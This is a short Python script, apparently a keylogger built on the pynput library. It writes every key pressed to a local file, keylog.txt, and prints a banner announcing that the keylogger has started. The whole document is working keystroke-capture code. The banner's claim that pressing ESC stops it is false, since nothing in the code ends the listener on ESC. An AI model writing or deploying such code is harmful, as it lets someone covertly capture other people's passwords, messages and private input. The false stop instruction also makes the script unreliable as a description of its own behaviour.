from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

print("🔴 Keylogger started. Press ESC to stop.")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
